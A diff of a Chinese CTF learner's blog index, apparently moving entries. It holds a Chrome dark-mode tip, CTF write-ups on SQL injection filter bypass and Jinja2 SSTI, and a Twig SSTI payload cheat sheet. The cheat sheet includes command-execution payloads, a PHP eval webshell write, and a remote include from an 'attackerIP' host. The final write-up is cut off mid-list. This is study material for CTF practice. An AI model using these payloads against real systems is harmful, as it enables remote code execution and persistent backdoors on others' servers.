+    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>chrome无论是主题设置为<code>Just Black</code>，还是利用各种插件，总是有不满意的地方。</p>
+<p>前者只是将状态栏、工具栏、书签栏和新标签页变成黑暗模式，而其他网页还是白的。</p>
+<p>而后者在页面切换的时候会先跳一下白，然后才会变黑。</p>
+<p>这些问题对于我这种强迫症患者是不能接受的。</p>
+<h1 id="解决方案">解决方案</h1>
+<p>我的机子的操作系统是 Win11。</p>
+<p>现在有一种完全不需要插件和主题的黑暗模式。</p>
+<ol type="1">
+<li><p>打开chrome，在地址栏输入<code>chrome://flags</code>，然后回车 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095058.png" /></p></li>
+<li><p>找到<code>Auto Dark Mode for Web Contents</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095132.png" /></p></li>
+<li><p>然后将红色方框设置为<code>Enabled</code>（我这里已经设置好了），然后重启即可 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095215.png" /></p></li>
+</ol>
+<h1 id="对比">对比</h1>
+<p>这是原来只改了主题的黑暗模式</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095502.png" /></p>
+<p>这是设置完成之后的黑暗模式</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095529.png" /></p>
+<h1 id="小问题">小问题</h1>
+<p>不过还是存在一点小bug的，看你们能不能接受了。我发现的一个就是在哔哩哔哩的播放界面，鼠标光标放到视频上的时候，视频会泛白，如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095649.png" /></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>chrome</tag>
+        <tag>dark mode</tag>
       </tags>
   </entry>
   <entry>
@@ -3185,53 +3185,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SWPU2019 Web1</title>
-    <url>/2022/04/13/SWPU2019%20Web1/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
-<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
-<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
-<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
-<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
-<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
-<h1 id="解题">解题</h1>
-<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
-<ul>
-<li>Bypass information_schema;</li>
-<li>无列名注入</li>
-</ul>
-<p>[[information_schema绕过及无列名注入]]</p>
-<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
-<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
-<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
-<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
-<p>（flag在<code>users</code>中）</p>
-<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
-<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
-<p>最终得到flag：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>无列名注入</tag>
-        <tag>Bypass information_schema</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Smarty模板注入</title>
     <url>/2022/04/05/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
@@ -3291,43 +3244,50 @@
       </tags>
   </entry>
   <entry>
-    <title>Twig模板注入</title>
-    <url>/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>记录一下关于Twig模板注入的知识点以及相关的payload。</p>
+    <title>SWPU2019 Web1</title>
+    <url>/2022/04/13/SWPU2019%20Web1/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
 <span id="more"></span>
-<h1 id="twig-1.x">Twig 1.x</h1>
-<p>在Twig 1.x下，存在全局变量<code>_self</code>，指向的是引用当前模板的实例，代码层面如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> specialVars = [</span><br><span class="line">    <span class="string">&#x27;_self&#x27;</span> =&gt; <span class="string">&#x27;this&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_context&#x27;</span> =&gt; <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_charset&#x27;</span> =&gt; <span class="string">&#x27;this-&gt;env-&gt;getCharset()&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
-<p>可以利用_self变量，返回当前 实例，该实例提供了指向Twig_Environment的env属性，因此，可以继续调用 Twig_Environment 中的其他方法，从而进行 SSTI。</p>
-<p>比如以下 Payload 可以调用 setCache 方法改变 Twig 加载 PHP 文件的路径，在 allow_url_include 开启的情况下我们可以通过改变路径实现远程文件包含： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attackerIP:port&quot;</span>)&#125;&#125;&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoorFile&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在SSTI的应用中，主要是因为<code>getFilter</code>函数中存在危险函数<code>call_user_func</code> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 第一个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">foreach</span> (this-&gt;filterCallbacks <span class="keyword">as</span> callback) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (<span class="literal">false</span> !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">			<span class="keyword">return</span> filter;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 第二个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params"><span class="keyword">callable</span></span>)</span>&#123;</span><br><span class="line">	this-&gt;filterCallbacks[] =<span class="keyword">callable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><strong>简单解释一下代码（不是很懂PHP）</strong>：</p>
-<p><code>getFilter</code>函数可以将<code>this-&gt;filterCallbacks</code>数组中的元素当作PHP函数的名称而调用，<code>name</code>就是PHP函数的参数。</p>
-<p>而<code>registerUndefinedFilterCallback</code>函数可以设置<code>this-&gt;filterCallbacks</code>数组，因此，思路就是先通过第二个函数设置我们要执行的函数，比如说<code>exec</code>，然后通过第一个函数调用这个函数，并由<code>name</code>传入函数执行所必要的参数。</p>
-<p>因此，构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这句话就类似在Linux系统中的shell直接执行命令<code>id</code>。</p>
-<p>在Twig 2.x/3.x中<code>_self</code>的作用发生变化，此payload不能继续使用。</p>
-<p>例题：<a href="https://hdfzzf.icu/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/">BJDCTF20Cookie is so stable</a></p>
-<h1 id="twig-2.x-3.x">Twig 2.x / 3.x</h1>
-<h2 id="map过滤器">map过滤器</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
-<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;phpinfo();&quot;</span>]|map(<span class="string">&quot;assert&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();eval(<span class="subst">$_POST</span>[shell])&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;    <span class="comment">// 写 Webshell</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="sort过滤器">sort过滤器</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
-<h2 id="filter过滤器">filter过滤器</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
-<h2 id="reduce过滤器">reduce过滤器</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
-<h1 id="参考白嫖">参考（白嫖）</h1>
-<ol type="1">
-<li>http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/</li>
-<li>https://xz.aliyun.com/t/10056#toc-16</li>
-</ol>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
+<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
+<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
+<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
+<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
+<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
+<h1 id="解题">解题</h1>
+<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
+<ul>
+<li>Bypass information_schema;</li>
+<li>无列名注入</li>
+</ul>
+<p>[[information_schema绕过及无列名注入]]</p>
+<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
+<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
+<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
+<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
+<p>（flag在<code>users</code>中）</p>
+<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
+<p>最终得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
 ]]></content>
       <categories>
-        <category>SSTI</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>Twig</tag>
+        <tag>无列名注入</tag>
+        <tag>Bypass information_schema</tag>
       </tags>
   </entry>
   <entry>
@@ -3380,6 +3340,81 @@
       </categories>
       <tags>
         <tag>Tornado</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Twig模板注入</title>
+    <url>/2022/04/05/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>记录一下关于Twig模板注入的知识点以及相关的payload。</p>
+<span id="more"></span>
+<h1 id="twig-1.x">Twig 1.x</h1>
+<p>在Twig 1.x下，存在全局变量<code>_self</code>，指向的是引用当前模板的实例，代码层面如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> specialVars = [</span><br><span class="line">    <span class="string">&#x27;_self&#x27;</span> =&gt; <span class="string">&#x27;this&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_context&#x27;</span> =&gt; <span class="string">&#x27;context&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_charset&#x27;</span> =&gt; <span class="string">&#x27;this-&gt;env-&gt;getCharset()&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p>
+<p>可以利用_self变量，返回当前 实例，该实例提供了指向Twig_Environment的env属性，因此，可以继续调用 Twig_Environment 中的其他方法，从而进行 SSTI。</p>
+<p>比如以下 Payload 可以调用 setCache 方法改变 Twig 加载 PHP 文件的路径，在 allow_url_include 开启的情况下我们可以通过改变路径实现远程文件包含： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attackerIP:port&quot;</span>)&#125;&#125;&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoorFile&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在SSTI的应用中，主要是因为<code>getFilter</code>函数中存在危险函数<code>call_user_func</code> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 第一个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">foreach</span> (this-&gt;filterCallbacks <span class="keyword">as</span> callback) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (<span class="literal">false</span> !==filter = call_user_func(callback,name)) &#123;</span><br><span class="line">			<span class="keyword">return</span> filter;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 第二个函数</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params"><span class="keyword">callable</span></span>)</span>&#123;</span><br><span class="line">	this-&gt;filterCallbacks[] =<span class="keyword">callable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>简单解释一下代码（不是很懂PHP）</strong>：</p>
+<p><code>getFilter</code>函数可以将<code>this-&gt;filterCallbacks</code>数组中的元素当作PHP函数的名称而调用，<code>name</code>就是PHP函数的参数。</p>
+<p>而<code>registerUndefinedFilterCallback</code>函数可以设置<code>this-&gt;filterCallbacks</code>数组，因此，思路就是先通过第二个函数设置我们要执行的函数，比如说<code>exec</code>，然后通过第一个函数调用这个函数，并由<code>name</code>传入函数执行所必要的参数。</p>
+<p>因此，构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这句话就类似在Linux系统中的shell直接执行命令<code>id</code>。</p>
+<p>在Twig 2.x/3.x中<code>_self</code>的作用发生变化，此payload不能继续使用。</p>
+<p>例题：<a href="https://hdfzzf.icu/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/">BJDCTF20Cookie is so stable</a></p>
+<h1 id="twig-2.x-3.x">Twig 2.x / 3.x</h1>
+<h2 id="map过滤器">map过滤器</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<p>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;phpinfo();&quot;</span>]|map(<span class="string">&quot;assert&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();eval(<span class="subst">$_POST</span>[shell])&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;    <span class="comment">// 写 Webshell</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="sort过滤器">sort过滤器</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<h2 id="filter过滤器">filter过滤器</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;passthru&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;exec&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<h2 id="reduce过滤器">reduce过滤器</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;id&quot;</span>)&#125;&#125;    <span class="comment">// 无回显</span></span><br></pre></td></tr></table></figure>
+<h1 id="参考白嫖">参考（白嫖）</h1>
+<ol type="1">
+<li>http://www.m1saka.love/index.php/2021/08/20/mobanzhuru/</li>
+<li>https://xz.aliyun.com/t/10056#toc-16</li>
+</ol>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Twig</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku_SSTI_2</title>
+    <url>/2022/04/05/bugku_SSTI_2/</url>
+    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
+<span id="more"></span>
+<h1 id="题目信息">1 题目信息</h1>
+<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
+<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
+<p>因此判断模板引擎是Jinjia2或者是flask。</p>
+<h1 id="解题">2 解题</h1>
+<p>输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来共有4种方法</p>
+<ul>
+<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
+<li><p>方法2</p></li>
+</ul>
